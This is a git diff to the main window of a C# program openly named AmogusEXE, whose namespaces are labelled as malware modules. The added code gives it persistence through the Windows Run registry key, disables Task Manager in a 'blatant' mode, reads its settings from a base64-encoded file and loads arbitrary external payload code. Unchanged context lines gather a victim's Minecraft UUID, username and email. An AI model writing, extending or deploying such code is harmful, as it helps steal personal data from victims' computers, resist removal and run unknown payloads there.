@@ -1,11 +1,17 @@
-﻿using System.Collections.Generic;
+﻿using System;
+using System.Collections.Generic;
 using System.Windows;
 using AmogusEXE.Malware.Sender;
 using AmogusEXE.Malware.Encoding;
 using AmogusEXE.Malware.Reader;
+using AmogusEXE.Malware.Custom;
 using AmogusEXE.Malware.Minecraft;
 using System.IO;
 using System.Net;
+using AmogusEXE.Malware.Blatant;
+using Microsoft.Win32;
+using Newtonsoft.Json;
+using Newtonsoft.Json.Linq;
 
 namespace AmogusEXE
 {
@@ -16,11 +22,24 @@ namespace AmogusEXE
     {
         public MainWindow()
         {
-            
+            Autoload();
             GetNecessaryStuff();
+            if (IsBlatant())
+            {
+                Functions.Blatant.DisableTaskManager();
+            }
+            else if (!IsBlatant())
+            {
+                if (!string.IsNullOrEmpty(GetNonBlatantMessage()))
+                {
+                    Functions.NonBlatant.Message(GetNonBlatantMessage());  
+                } 
+            }
             InitializeComponent();
             new ForeverWindow();
             Close();
+            Payload pl = new Payload();
+            pl.Load();
         }
 
         public static void GetNecessaryStuff()
@@ -52,7 +71,32 @@ namespace AmogusEXE
                         $"Minecraft profile UUID: {profileID}\n" +
                         $"Minecraft possible username: {minecraftName}\n" +
                         $"Possible victim's email: {email}" +
-                        "\n \nAmogus.EXE currently runs in background and can be used as miner or whatever, you could just download source code and add your miner here.\"");
+                        "\n \nIf you provided any external payload code, it will be executed now.\"");
+        }
+
+        public static void Autoload()
+        {
+            RegistryKey rk = Registry.CurrentUser.OpenSubKey
+                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            rk.SetValue("amogus.exe", $"{Directory.GetCurrentDirectory()}\\AmogusEXE.exe");
+        }
+
+        public static bool IsBlatant()
+        {
+            string b64 = File.ReadAllText($"{Directory.GetCurrentDirectory()}\\data.enc");
+            Base64 b = new Base64(b64, Base64Encoder.Decode);
+            string j = b.OperatedData;
+            JObject json = JsonConvert.DeserializeObject<JObject>(j);
+            return (bool) json["blatant"];
+        }
+
+        public static string GetNonBlatantMessage()
+        {
+            string b64 = File.ReadAllText($"{Directory.GetCurrentDirectory()}\\data.enc");
+            Base64 b = new Base64(b64, Base64Encoder.Decode);
+            string j = b.OperatedData;
+            JObject json = JsonConvert.DeserializeObject<JObject>(j);
+            return (string) json["hideMessage"];
         }
     }
 }
